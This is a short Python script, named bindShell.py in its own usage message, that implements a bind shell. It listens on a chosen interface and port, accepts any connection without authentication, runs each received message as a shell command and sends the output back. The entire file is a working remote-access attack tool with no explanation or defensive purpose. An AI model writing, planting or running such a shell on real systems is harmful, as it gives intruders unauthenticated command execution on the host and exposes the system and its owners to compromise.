import select 
import socket 
import sys 
from subprocess import Popen, PIPE 
if len(sys.argv) != 3: 
    print("[-] usage: bindShell.py <interface> <port>") 
    exit() 
host  = sys.argv[1] 
port = int(sys.argv[2]) 
size = 1024 
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((host,port)) 
server.listen(10) 
input = [server,sys.stdin] 
running = 1 
while running: 
    inputready,outputready,exceptready = select.select(input,[],[]) 
    for s in inputready: 
        if s == server: 
            client, address = server.accept() 
            input.append(client) 
        else: 
            data = s.recv(size) 
            if data: 
                proc = Popen(data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE) 
                stdout_value = proc.stdout.read() + proc.stderr.read() 
                s.send(stdout_value) 
            else: 
                s.close() 
                input.remove(s) 
server.close() 
